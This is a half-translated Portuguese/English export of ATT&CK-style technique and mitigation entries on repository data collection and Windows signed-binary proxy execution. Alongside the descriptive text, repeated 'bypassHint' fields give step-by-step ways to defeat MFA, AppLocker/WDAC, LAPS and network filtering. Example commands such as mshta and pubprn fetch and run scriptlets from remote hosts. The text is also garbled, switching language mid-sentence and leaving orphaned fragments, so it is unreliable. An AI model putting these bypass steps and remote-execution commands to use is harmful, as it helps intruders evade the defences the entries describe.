techniques.fullNamePt: Dados de Repositórios de Informação
techniques.descriptionPt:
Os adversários podem tirar partido de information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, such as Credential Access, Lateral Movement, or Defense Evasion, or direct access to the target information. Os adversários podem também abuse external sharing features to share sensitive documents with recipients outside of the organization (i.e., **Transfer Data to Cloud Account** (`T1537`)). 

The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:

* Policies, procedures, and standards
* Physical / logical network diagrams
* System architecture diagrams
* Technical system documentation
* Testing / development credentials (i.e., **Unsecured Credentials** (`T1552`)) 
* Work / project schedules
* Source code snippets
* Links to network shares and other internal resources
* Contact or other informação sensível about business partners and customers, including personally identifiable information (PII) 

Information stored in a repository may vary based on the specific instance or environment. Specific common information repositories include the following:

* Storage services such as IaaS databases, enterprise databases, and more specialized platforms such as customer relationship management (CRM) databases 
* Collaboration platforms such as SharePoint, Confluence, and code repositories
* Messaging platforms such as Slack and Microsoft Teams 

In some cases, information repositories have been improperly secured, typically by unintentionally allowing for overly-broad access by all users or even public access to unauthenticated users. This is particularly common with cloud-native or cloud-hosted services, such as AWS Relational Database Service (RDS), Redis, or ElasticSearch. `[Ref: Mitiga]` `[Ref: TrendMicro Exposed Redis 2020]` `[Ref: Cybernews Reuters Leak 2022]`

mitigations.name: Multi-factor Authentication
mitigations.descriptionPt: Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.
mitigations.bypassHint: Vetores de contorno de MFA: (1) Roubo de Session Cookies / PRT (Primary Refresh Token) já autenticados a partir do endpoint da vítima (`T1539` / `T1528`); (2) Adversary-in-the-Middle (AitM) Reverse Proxy Phishing (ex: Evilginx2 - `T1557`) para capturar o token de sessão pós-MFA; (3) Device Code Phishing (`T1528`) ou abuso de Refresh Tokens OAuth; (4) Se o utilizador já tem sessão num host interno, operar por SOCKS proxy através do beacon na estação da vítima (`T1090.001`).

mitigations.name: Out-of-Band Communications Channel
mitigations.descriptionPt: Create plans for leveraging a secure out-of-band communications channel, rather than existing in-network chat applications, in case of a security incident. `[Ref: TrustedSec OOB Communications]`

mitigations.name: User Training
mitigations.descriptionPt: Develop and publish policies that define acceptable information to be stored in repositories.

mitigations.name: Software Configuration
mitigations.descriptionPt: Consider implementing data retention policies to automate periodically archiving and/or deleting data that is no longer needed.

mitigations.name: User Account Management
mitigations.descriptionPt: Forçar a aplicação de the principle of least-privilege. Consider implementing access control mechanisms that include both authentication and authorization.

mitigations.name: Audit
mitigations.descriptionPt: Consider periodic review of accounts and privileges for critical and sensitive repositories. Garantir que repositories such as cloud-hosted databases are not unintentionally exposed to the public, and that security groups assigned to them permit only necessary and authorized hosts. `[Ref: AWS DB VPC]`
mitigations.bypassHint: Aplicar Command-Line Spoofing (criar processo suspenso com argumentos benignos como `svchost.exe -k netsvcs`, alterar `PEB->ProcessParameters->CommandLine` para o comando real e resumir a thread - `T1036.004`), Parent PID Spoofing (`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` - `T1134.004`) e substituir ferramentas de CLI barulhentas (`whoami`, `net user`, `nltest`) por chamadas diretas a APIs Win32/LDAP via BOFs (Beacon Object Files) em memória.

Os adversários podem tirar partido de the SharePoint repository as a source to mine valuable information. `[Ref: Information architecture guidance for SharePoint Online portals]` SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. * Physical / logical network diagrams
* System architecture diagrams
* Technical system documentation
* Testing / development credentials (i.e., **Unsecured Credentials** (`T1552`))
* Work / project schedules
* Source code snippets
* Links to network shares and other internal resources

techniques.fullNameEn: Data from Information Repositories: Code Repositories
techniques.fullNamePt: Dados de Repositórios de Informação: Code Repositories
techniques.descriptionPt:
Os adversários podem tirar partido de code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.

Uma vez que adversaries gain access to a victim network or a private code repository, they may collect informação sensível such as proprietary source code or **Unsecured Credentials** (`T1552`) contained within software's source code.  Having access to software's source code may allow adversaries to develop **Exploits** (`T1587.004`), while credentials may provide access to additional resources using **Valid Accounts** (`T1078`). `[Ref: Wired Uber Breach]` `[Ref: Krebs Adobe]`

**Note:** This is distinct from **Code Repositories** (`T1593.003`), which focuses on conducting **Reconnaissance** (`TA0043`) via public code repositories.

techniques.fullNameEn: Data from Information Repositories: Customer Relationship Management Software
techniques.fullNamePt: Dados de Repositórios de Informação: Customer Relationship Management Software
techniques.descriptionPt:
Os adversários podem tirar partido de Customer Relationship Management (CRM) software to mine valuable information. CRM software é utilizado para assist organizations in tracking and managing customer interactions, as well as storing customer data.

Uma vez que adversaries gain access to a victim organization, they may mine CRM software for customer data. This may include personally identifiable information (PII) such as full names, emails, phone numbers, and addresses, as well as additional details such as purchase histories and IT support interactions. By collecting this data, an adversary may be able to send personalized **Phishing** (`T1566`) emails, engage in SIM swapping, or otherwise target the organization’s customers in ways that enable financial gain or the compromise of additional organizations. `[Ref: Bleeping Computer US Cellular Hack 2022]` `[Ref: Bleeping Computer Mint Mobile Hack 2021]` `[Ref: Bleeping Computer Bank Hack 2020]`

CRM software may be hosted on-premises or in the cloud. Information stored in these solutions may vary based on the specific instance or environment. Examples of CRM software include Microsoft Dynamics 365, Salesforce, Zoho, Zendesk, and HubSpot.

techniques.fullNameEn: Data from Information Repositories: Messaging Applications
techniques.fullNamePt: Dados de Repositórios de Informação: Messaging Applications
techniques.descriptionPt:
Os adversários podem tirar partido de chat and messaging applications, such as Microsoft Teams, Google Chat, and Slack, to mine valuable information.  

The following is a brief list of example information that may hold potential value to an adversary and may also be found on messaging applications: 

* Testing / development credentials (i.e., **Chat Messages** (`T1552.008`)) 
* Source code snippets 
* Links to network shares and other internal resources 
* Proprietary data `[Ref: Guardian Grand Theft Auto Leak 2022]`
* Discussions about ongoing incident response efforts `[Ref: SC Magazine Ragnar Locker 2021]` `[Ref: Microsoft DEV-0537]`

Adicionalmente a exfiltrating data from messaging applications, adversaries may leverage data from chat messages com o objetivo de improve their targeting - for example, by learning more about an environment or evading ongoing incident response efforts. `[Ref: Sentinel Labs NullBulge 2024]` `[Ref: Permiso Scattered Spider 2023]`

mitigations.descriptionPt: Develop and publish policies that define acceptable information to be posted in chat applications.

mitigations.name: Audit
mitigations.descriptionPt: Preemptively search through communication services to find inappropriately shared data, and take actions to reduce exposure when found.

mitigations.descriptionPt: Implementar secure out-of-band communication channels to use as an alternative to in-network chat applications during a security incident. This ensures that critical communications remain secure even if primary messaging channels are compromised by adversaries. `[Ref: TrustedSec OOB Communications]`

techniques.fullNamePt: Dados de Repositórios de Informação: Databases
techniques.descriptionPt:
Os adversários podem tirar partido de databases to mine valuable information. These databases may be hosted on-premises or in the cloud (both in platform-as-a-service and software-as-a-service environments). 

Examples of databases from which information may be collected include MySQL, PostgreSQL, MongoDB, Amazon Relational Database Service, Azure SQL Database, Google Firebase, and Snowflake. Databases may include a variety of information of interest to adversaries, such as usernames, hashed passwords, personally identifiable information, and financial data. Data collected from databases may be used for **Lateral Movement** (`TA0008`), **Command and Control** (`TA0011`), or **Exfiltration** (`TA0010`). Data exfiltrated from databases may also be used to extort victims or may be sold for profit. `[Ref: Google Cloud Threat Intelligence UNC5537 Snowflake 2024]`

techniques.fullNamePt: System Script Encaminhamento via Proxy / Redirector Execution: PubPrn
techniques.descriptionPt:
Os adversários podem utilizar PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a **Visual Basic** (`T1059.005`) script that publishes a printer to Active Directory (AD) Domain Services. The script may be signed by Microsoft and is commonly executed through the **Windows Command Shell** (`T1059.003`) via `Cscript.exe`. Por exemplo, the following code publishes a printer within the specified domain: `cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com`. `[Ref: pubprn]`

Os adversários podem abusar de PubPrn para executar código ou artefactos maliciosos payloads hosted on remote sites. `[Ref: Enigma0x3 PubPrn Bypass]` To do so, adversaries may set the second `script:` parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is `pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct`. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

In later versions of Windows (10+), `PubPrn.vbs` has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to `LDAP://`, vice the `script:` moniker which could be used to reference remote code via HTTP(S).

techniques.fullNamePt: System Script Encaminhamento via Proxy / Redirector Execution: SyncAppvPublishingServer
techniques.descriptionPt:
Os adversários podem abusar de SyncAppvPublishingServer.vbs to proxy execution of malicious **PowerShell** (`T1059.001`) commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V). `[Ref: 1 - appv]` Por exemplo, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally. `[Ref: 2 - appv]` `[Ref: 3 - appv]`
    
The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\System32` through the command line via `wscript.exe`. `[Ref: 4 - appv]` `[Ref: 5 - appv]`

Os adversários podem abusar de SyncAppvPublishingServer.vbs para contornar (bypass) **PowerShell** (`T1059.001`) execution restrictions and evade defensive counter measures by "living off the land." `[Ref: 6 - appv]` `[Ref: 4 - appv]` Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`. `[Ref: 7 - appv]`

Por exemplo,  **PowerShell** (`T1059.001`) commands may be invoked using: `[Ref: 5 - appv]`

`SyncAppvPublishingServer.vbs "n; {PowerShell}"`

techniques.fullNamePt: Browser Information Discovery
techniques.descriptionPt:
Os adversários podem enumerar information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure. `[Ref: Kaspersky Autofill]`

Browser information may also highlight additional targets after an adversary has access to valid credentials, especially **Credentials In Files** (`T1552.001`) associated with logins cached by a browser.

Specific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`). `[Ref: Chrome Roaming Profiles]`

techniques.namePt: System Binary Encaminhamento via Proxy / Redirector Execution
techniques.fullNamePt: System Binary Encaminhamento via Proxy / Redirector Execution
techniques.descriptionPt:
Os adversários podem contornar (bypass) process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the sistema operativo. `[Ref: LOLBAS Project]` Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations pode ser utilizado para proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as `split` to proxy execution of malicious commands. `[Ref: split man page]` `[Ref: GTFO split]`

mitigations.name: Exploit Protection
mitigations.descriptionPt: Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature pode ser utilizado para block methods of using using trusted binaries para contornar (bypass) application control.

mitigations.name: Filter Network Traffic
mitigations.descriptionPt: Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configurar software on endpoints to filter tráfego de rede.
mitigations.bypassHint: Procurar protocolos alternativos abertos no host de destino: (1) Se RPC/DCOM alternativo ou portas altas estiverem acessíveis, usar DCOM (`MMC20.Application`, `ShellWindows` - `T1021.003`); (2) Se MSSQL (1433) estiver acessível, usar `xp_cmdshell` ou CLR Assemblies; (3) Se SSH (22) ou RDP (3389) estiverem abertos, usar RestrictedAdmin Mode (`sekurlsa::pth` + `mstsc /restrictedadmin` - `T1021.001`); (4) Abusar de partilhas de ficheiros ou GPOs / SCCM para implantação indireta (`T1072`).

mitigations.name: Privileged Account Management
mitigations.descriptionPt: Restrict execution of particularly vulnerable binaries to privileged accounts or groups that need to use it to lessen the opportunities for malicious usage.
mitigations.bypassHint: Abandonar a tentativa de reutilização horizontal de credenciais locais. Em vez disso: (1) Enumerar quem tem permissão de leitura do atributo `ms-Mcs-AdmPwd` (LAPS v1) ou `msLAPS-Password` / `msLAPS-EncryptedPassword` (Windows LAPS) no Active Directory via LDAP (`T1087.002`); (2) Extrair Tokens ou Tickets Kerberos de utilizadores de domínio com sessão ativa na máquina comprometida (`T1134.001` / `T1550.003`); (3) Explorar delegações Kerberos (Unconstrained / Constrained / RBCD - `T1558`) ou certificados AD CS vulneráveis (ESC1-ESC8 - `T1649`).

mitigations.name: Execution Prevention
mitigations.descriptionPt: Consider using application control to prevent execution of binaries that are susceptible to abuse and not required for a given system or network.
mitigations.bypassHint: Enumerar regras de AppLocker em `HKLM\Software\Policies\Microsoft\Windows\SrpV2` e localizar diretórios graváveis dentro de `C:\Windows\` (ex: `C:\Windows\Tasks`, `C:\Windows\Temp`, `C:\Windows\tracing`, `C:\Windows\System32\spool\drivers\color`). Caso haja validação de assinatura/hash (WDAC), utilizar Living-off-the-Land Binaries (LOLBAS) assinados pela Microsoft como `MSBuild.exe` (T1127.001), `InstallUtil.exe` (T1218.004), `Regsvr32.exe` (T1218.010) ou `Certutil.exe`.

mitigations.name: Disable or Remove Feature or Program
mitigations.descriptionPt: Many native binaries may not be necessary within a given environment.
mitigations.bypassHint: Para PowerShell bloqueado: o motor do PowerShell reside em `System.Management.Automation.dll`, não no executável `powershell.exe`. Carregar a DLL diretamente dentro de um binário C# compilado ou via `MSBuild.exe` / `InstallUtil.exe` (Unmanaged PowerShell - `T1059.001` + `T1127.001`). Para bloqueio de Macros Office (MotW): usar contentores `.ISO`/`.VHDX` ou ficheiros `.LNK` / `.WSF` / ClickOnce (`T1553.005`, `T1204.002`).

techniques.fullNameEn: System Binary Proxy Execution: Compiled HTML File
techniques.fullNamePt: System Binary Encaminhamento via Proxy / Redirector Execution: Compiled HTML File
techniques.descriptionPt:
Os adversários podem abusar de Compiled HTML files (.chm) to conceal código malicioso. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.  `[Ref: Microsoft HTML Help May 2018]` CHM content is displayed using underlying components of the Internet Explorer browser  `[Ref: Microsoft HTML Help ActiveX]` loaded by the HTML Help executable program (hh.exe).  `[Ref: Microsoft HTML Help Executable Program]`

A custom CHM file containing embedded payloads could be delivered to a victim then triggered by **User Execution** (`T1204`). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe.  `[Ref: MsitPros CHM Aug 2017]`  `[Ref: Microsoft CVE-2017-8625 Aug 2017]`

techniques.fullNameEn: System Binary Proxy Execution: Control Panel
techniques.fullNamePt: System Binary Encaminhamento via Proxy / Redirector Execution: Control Panel
techniques.descriptionPt:
Os adversários podem abusar de control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.

Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a `CPlApplet` function. `[Ref: Microsoft Implementing CPL]` `[Ref: TrendMicro CPL Malware Jan 2014]` For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. `[Ref: Microsoft Implementing CPL]` Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. `[Ref: Microsoft Implementing CPL]`  `[Ref: TrendMicro CPL Malware Jan 2014]` `[Ref: TrendMicro CPL Malware Dec 2013]`

Malicious Control Panel items can be delivered via **Phishing** (`T1566`) campaigns `[Ref: TrendMicro CPL Malware Jan 2014]` `[Ref: TrendMicro CPL Malware Dec 2013]` or executed as part of multi-stage malware. `[Ref: Palo Alto Reaver Nov 2017]` Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.

Os adversários podem também rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to `HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls`. Even when these registered DLLs do not comply with the CPL file specification and do not export `CPlApplet` functions, they are loaded and executed through its `DllEntryPoint` when Control Panel is executed. CPL files not exporting `CPlApplet` are not directly executable. `[Ref: ESET InvisiMole June 2020]`

mitigations.name: Restrict File and Directory Permissions
mitigations.descriptionPt: Restrict storage and execution of Control Panel items to protected directories, such as `C:\Windows`, rather than user directories.
mitigations.bypassHint: Auditar permissões efetivas com `AccessChk` / `PowerUp` procurando Unquoted Service Paths (`T1574.009`), Ghost DLL Hijacking (DLLs inexistentes que um serviço `SYSTEM` tenta carregar a partir de pastas no `PATH` onde o utilizador tem escrita - `T1574.001`) ou explorar privilégios de token como `SeBackupPrivilege` / `SeRestorePrivilege` para ignorar ACLs NTFS (`FILE_FLAG_BACKUP_SEMANTICS`).

mitigations.name: Execution Prevention
mitigations.descriptionPt: Identify and block potentially malicious and unknown .cpl files by using application control  `[Ref: Beechey 2010]` tools, like Windows Defender Application Control `[Ref: Microsoft Windows Defender Application Control]`, AppLocker,  `[Ref: Windows Commands JPCERT]`  `[Ref: NSA MS AppLocker]` or Software Restriction Policies  `[Ref: Corio 2008]` where appropriate.  `[Ref: TechNet Applocker vs SRP]`
mitigations.bypassHint: Enumerar regras de AppLocker em `HKLM\Software\Policies\Microsoft\Windows\SrpV2` e localizar diretórios graváveis dentro de `C:\Windows\` (ex: `C:\Windows\Tasks`, `C:\Windows\Temp`, `C:\Windows\tracing`, `C:\Windows\System32\spool\drivers\color`). Caso haja validação de assinatura/hash (WDAC), utilizar Living-off-the-Land Binaries (LOLBAS) assinados pela Microsoft como `MSBuild.exe` (T1127.001), `InstallUtil.exe` (T1218.004), `Regsvr32.exe` (T1218.010) ou `Certutil.exe`.

techniques.fullNamePt: System Binary Encaminhamento via Proxy / Redirector Execution: CMSTP
techniques.descriptionPt:
Os adversários podem abusar de CMSTP to proxy execution of código malicioso. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.  `[Ref: Microsoft Connection Manager Oct 2009]` CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

Os adversários podem supply CMSTP.exe with INF files infected with malicious commands.  `[Ref: Twitter CMSTP Usage Jan 2018]` De forma semelhante a **Regsvr32** (`T1218.010`) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs  `[Ref: MSitPros CMSTP Aug 2017]`  and/or COM scriptlets (SCT) from remote servers.  `[Ref: Twitter CMSTP Jan 2018]`  `[Ref: GitHub Ultimate AppLocker Bypass List]`  `[Ref: Endurant CMSTP July 2018]` This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.

CMSTP.exe can also be abused to **Bypass User Account Control** (`T1548.002`) and execute comandos arbitrários from a malicious INF through an auto-elevated COM interface.  `[Ref: MSitPros CMSTP Aug 2017]`  `[Ref: GitHub Ultimate AppLocker Bypass List]`  `[Ref: Endurant CMSTP July 2018]`

mitigations.name: Execution Prevention
mitigations.descriptionPt: Consider using application control configured to block execution of CMSTP.exe if it is not required for a given system or network to prevent potential misuse by adversaries.

Caso haja validação de assinatura/hash (WDAC), utilizar Living-off-the-Land Binaries (LOLBAS) assinados pela Microsoft como `MSBuild.exe` (T1127.001), `InstallUtil.exe` (T1218.004), `Regsvr32.exe` (T1218.010) ou `Certutil.exe`.

mitigations.name: Disable or Remove Feature or Program

techniques.fullNamePt: System Binary Encaminhamento via Proxy / Redirector Execution: InstallUtil
techniques.descriptionPt:
Os adversários podem utilizar InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.  `[Ref: MSDN InstallUtil]` The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: `C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe` and `C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe`.

InstallUtil may also be used para contornar (bypass) application control through use of attributes within the binary that execute the class decorated with the attribute `[System.ComponentModel.RunInstaller(true)]`.  `[Ref: LOLBAS Installutil]`

techniques.fullNamePt: System Binary Encaminhamento via Proxy / Redirector Execution: Mshta
techniques.descriptionPt:
Os adversários podem abusar de mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code  `[Ref: Cylance Dust Storm]`  `[Ref: Red Canary HTA Abuse Part Deux]`  `[Ref: FireEye Attacks Leveraging HTA]`  `[Ref: Airbus Security Kovter Analysis]`  `[Ref: FireEye FIN7 April 2017]` 

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  `[Ref: Wikipedia HTML Application]` HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.  `[Ref: MSDN HTML Applications]`

Files may be executed by mshta.exe through an inline script: `mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))`

They may also be executed directly from URLs: `mshta http[:]//webserver/payload[.]hta`

Mshta.exe pode ser utilizado para bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.  `[Ref: LOLBAS Mshta]`
codeArtifacts: [Ref: Red Canary HTA Abuse Part Deux]

mitigations.name: Execution Prevention
mitigations.descriptionPt: Utilizar Application Control (ex: AppLocker / WDAC) configured to block execution of `mshta.exe` if it is not required for a given system or network to prevent potential misuse by adversaries. Por exemplo, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the `mshta.exe` application and to prevent abuse. `[Ref: Microsoft WDAC]`

techniques.descriptionPt:
Os adversários podem abusar de msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). `[Ref: Microsoft msiexec]` The Msiexec.exe binary may also be digitally signed by Microsoft.

Os adversários podem abusar de msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. `[Ref: LOLBAS Msiexec]` `[Ref: TrendMicro Msiexec Feb 2018]` Since it may be signed and native on Windows systems, msiexec.exe pode ser utilizado para bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the `AlwaysInstallElevated` policy is enabled. `[Ref: Microsoft AlwaysInstallElevated 2018]`

mitigations.name: Disable or Remove Feature or Program
mitigations.descriptionPt: Consider disabling the `AlwaysInstallElevated` policy to prevent elevated execution of Windows Installer packages. `[Ref: Microsoft AlwaysInstallElevated 2018]`
mitigations.bypassHint: Para PowerShell bloqueado: o motor do PowerShell reside em `System.Management.Automation.dll`, não no executável `powershell.exe`. Carregar a DLL diretamente dentro de um binário C# compilado ou via `MSBuild.exe` / `InstallUtil.exe` (Unmanaged PowerShell - `T1059.001` + `T1127.001`). Para bloqueio de Macros Office (MotW): usar contentores `.ISO`/`.VHDX` ou ficheiros `.LNK` / `.WSF` / ClickOnce (`T1553.005`, `T1204.002`).

mitigations.name: Privileged Account Management
mitigations.descriptionPt: Restrict execution of Msiexec.exe to privileged accounts or groups that need to use it to lessen the opportunities for malicious usage.
mitigations.bypassHint: Abandonar a tentativa de reutilização horizontal de credenciais locais. Em vez disso: (1) Enumerar quem tem permissão de leitura do atributo `ms-Mcs-AdmPwd` (LAPS v1) ou `msLAPS-Password` / `msLAPS-EncryptedPassword` (Windows LAPS) no Active Directory via LDAP (`T1087.002`); (2) Extrair Tokens ou Tickets Kerberos de utilizadores de domínio com sessão ativa na máquina comprometida (`T1134.001` / `T1550.003`); (3) Explorar delegações Kerberos (Unconstrained / Constrained / RBCD - `T1558`) ou certificados AD CS vulneráveis (ESC1-ESC8 - `T1649`).

techniques.fullNamePt: System Binary Encaminhamento via Proxy / Redirector Execution: Odbcconf
techniques.descriptionPt:
Os adversários podem abusar de odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. `[Ref: Microsoft odbcconf.exe]` The Odbcconf.exe binary may be digitally signed by Microsoft.

Os adversários podem abusar de odbcconf.exe para contornar (bypass) application control solutions that do not account for its potential abuse. De forma semelhante a **Regsvr32** (`T1218.010`), odbcconf.exe has a `REGSVR` flag that can be misused to execute DLLs (ex: `odbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"}`).  `[Ref: LOLBAS Odbcconf]` `[Ref: TrendMicro Squiblydoo Aug 2017]` `[Ref: TrendMicro Cobalt Group Nov 2017]`

mitigations.name: Disable or Remove Feature or Program
mitigations.descriptionPt: Odbcconf.exe may not be necessary within a given environment.
mitigations.bypassHint: Para PowerShell bloqueado: o motor do PowerShell reside em `System.Management.Automation.dll`, não no executável `powershell.exe`. Carregar a DLL diretamente dentro de um binário C# compilado ou via `MSBuild.exe` / `InstallUtil.exe` (Unmanaged PowerShell - `T1059.001` + `T1127.001`). Para bloqueio de Macros Office (MotW): usar contentores `.ISO`/`.VHDX` ou ficheiros `.LNK` / `.WSF` / ClickOnce (`T1553.005`, `T1204.002`).

mitigations.name: Execution Prevention
mitigations.descriptionPt: Utilizar Application Control (ex: AppLocker / WDAC) configured to block execution of Odbcconf.exe if it is not required for a given system or network to prevent potential misuse by adversaries.
mitigations.bypassHint: Enumerar regras de AppLocker em `HKLM\Software\Policies\Microsoft\Windows\SrpV2` e localizar diretórios graváveis dentro de `C:\Windows\` (ex: `C:\Windows\Tasks`, `C:\Windows\Temp`, `C:\Windows\tracing`, `C:\Windows\System32\spool\drivers\color`). Caso haja validação de assinatura/hash (WDAC), utilizar Living-off-the-Land Binaries (LOLBAS) assinados pela Microsoft como `MSBuild.exe` (T1127.001), `InstallUtil.exe` (T1218.004), `Regsvr32.exe` (T1218.010) ou `Certutil.exe`.

techniques.fullNamePt: System Binary Encaminhamento via Proxy / Redirector Execution: Regsvcs/Regasm
techniques.descriptionPt:
Os adversários podem abusar de Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that são utilizados para register .NET **Component Object Model** (`T1559.001`) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft.  `[Ref: MSDN Regsvcs]`  `[Ref: MSDN Regasm]`

Both utilities pode ser empregue para bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: `[ComRegisterFunction]` or `[ComUnregisterFunction]` respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.  `[Ref: LOLBAS Regsvcs]` `[Ref: LOLBAS Regasm]`

Caso haja validação de assinatura/hash (WDAC), utilizar Living-off-the-Land Binaries (LOLBAS) assinados pela Microsoft como `MSBuild.exe` (T1127.001), `InstallUtil.exe` (T1218.004), `Regsvr32.exe` (T1218.010) ou `Certutil.exe`.

techniques.fullNamePt: System Binary Encaminhamento via Proxy / Redirector Execution: Regsvr32
techniques.descriptionPt:
Os adversários podem abusar de Regsvr32.exe to proxy execution of código malicioso. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft.  `[Ref: Microsoft Regsvr32]`

Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe pode também ser utilizado para specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  `[Ref: LOLBAS Regsvr32]` This variation of the technique is often referred to as a "Squiblydoo" and has been used in campaigns targeting governments.  `[Ref: Carbon Black Squiblydoo Apr 2016]`  `[Ref: FireEye Regsvr32 Targeting Mongolian Gov]`

Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via **Component Object Model Hijacking** (`T1546.015`).  `[Ref: Carbon Black Squiblydoo Apr 2016]`

mitigations.name: Exploit Protection
mitigations.descriptionPt: Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature pode ser utilizado para block regsvr32.exe from being used para contornar (bypass) application control.  `[Ref: Secure Host Baseline EMET]` Identify and block potentially malicious software executed through regsvr32 functionality by using application control  `[Ref: Beechey 2010]` tools, like Windows Defender Application Control `[Ref: Microsoft Windows Defender Application Control]`, AppLocker,  `[Ref: Windows Commands JPCERT]`  `[Ref: NSA MS AppLocker]` or Software Restriction Policies  `[Ref: Corio 2008]` where appropriate.  `[Ref: TechNet Applocker vs SRP]`

detections.name: Detection Strategy for System Binary Proxy Execution: Regsvr32

analytics.name: Analytic 0785
analytics.descriptionPt: Detection focuses on identifying anomalous regsvr32.exe executions that deviate from normal administrative or system use. Defenders may observe regsvr32.exe loading scriptlets or DLLs from unusual paths (especially temporary directories or remote URLs), command-line arguments invoking /i or /u with suspicious file references, network connections initiated by regsvr32.exe, and unsigned or untrusted DLLs being loaded shortly after regsvr32.exe invocation. Correlated sequences include regsvr32.exe process creation, module load of DLL/scriptlet, and optional outbound tráfego de rede.

mutableElements.description: Directories where DLL loading via regsvr32.exe is expected (e.g., C:\Windows\System32).
File extensions considered suspicious when executed by regsvr32.exe (e.g., .sct, .ocx).
Timeframe to correlate regsvr32.exe process creation with subsequent module loads and network connections.
Parent processes from which regsvr32.exe is expected (e.g., explorer.exe during legitimate COM object registration).

techniques.fullNamePt: System Binary Encaminhamento via Proxy / Redirector Execution: Rundll32
techniques.descriptionPt:
